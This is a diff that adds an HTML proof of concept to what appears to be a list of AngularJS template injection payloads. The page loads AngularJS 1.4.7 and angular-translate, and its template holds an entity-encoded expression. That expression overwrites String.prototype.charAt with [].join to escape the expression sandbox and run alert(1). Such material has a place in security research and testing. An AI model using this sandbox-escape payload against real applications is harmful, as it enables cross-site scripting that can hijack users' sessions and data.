@@ -171,3 +171,25 @@ http://jsfiddle.net/2zs2yv7o/209/
 </div>
 </body>
 </html>
+
+#angularjs2
+https://jsfiddle.net/67zm6y4L/
+<!DOCTYPE html>
+<html ng-app="myApp">
+  <head>
+    <script src="https://code.angularjs.org/1.4.7/angular.js"></script>
+    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate/2.9.0/angular-translate.js"></script>
+    <script>
+    var app = angular.module("myApp",['pascalprecht.translate']);
+        app.config(["$translateProvider",function($translateProvider){
+    }]);
+    app.controller("translateController" ,["$scope","$translate",function($scope,$translate){}]);
+    </script>
+  </head>
+
+  <body>
+    <div ng-controller="translateController">
+      <p>{{ "&#x7b;&#x7b;&apos;a&apos;.constructor.prototype.charAt=[].join;\&#x7d;\&#x7d;{{&apos;{{x=alert(1)\\}\\}&apos;|translate\}\}" | translate }}</p>
+    </div>
+  </body>
+</html>
